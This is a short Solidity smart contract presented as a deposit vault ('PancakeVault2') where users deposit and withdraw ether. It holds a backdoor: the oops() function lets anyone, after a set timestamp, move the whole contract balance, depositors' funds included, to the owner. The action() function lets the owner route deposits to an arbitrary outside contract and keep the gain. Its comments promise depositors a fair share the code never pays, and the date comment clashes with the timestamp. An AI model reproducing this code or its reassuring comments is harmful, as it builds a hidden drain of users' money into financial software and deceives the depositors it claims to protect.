pragma solidity 0.4.25;

interface PancakeFactory {
    function action(address account) external payable;
}

contract PancakeVault2 {
    address public owner;
    mapping(address => uint256) public vault;
    
    event onDeposit(address participant, uint256 amount);
    event onWithdraw(address participant, uint256 amount);
    event onAction(uint256 balance1, uint256 balance2);

    constructor() public {
        owner = msg.sender;
    }

    function deposit() external payable {
        vault[msg.sender] += msg.value;
        emit onDeposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = vault[msg.sender];
        vault[msg.sender] = 0;
        msg.sender.transfer(amount);
        emit onWithdraw(msg.sender, amount);
    }

    function action(address factory, address account, uint256 amount) external {
        require(msg.sender == owner, "only owner");

        // save the current contract balance
        uint256 balance1 = address(this).balance;

        // trigger the pancake factory
        PancakeFactory panfac = PancakeFactory(factory);
        panfac.action.value(amount)(account);

        // revert if there are no additional pancakes.
        // nobody can lose any deposits.
        uint256 balance2 = address(this).balance;
        require(balance2 >= balance1, "balance too low");

        // transfer the production to the owner.
        // every depositor will get a fair share of the production later.
        if(balance2 > balance1) {
           owner.transfer(balance2 - balance1);
        }
        
        emit onAction(balance1, balance2);
    }

    function oops() external {
        require(now >= 1554580800);  // only after 6th May 2019 @ 8:00pm (UTC)
        owner.transfer(address(this).balance);
    }

    function() external payable {
        // silly fallback function
    }
}
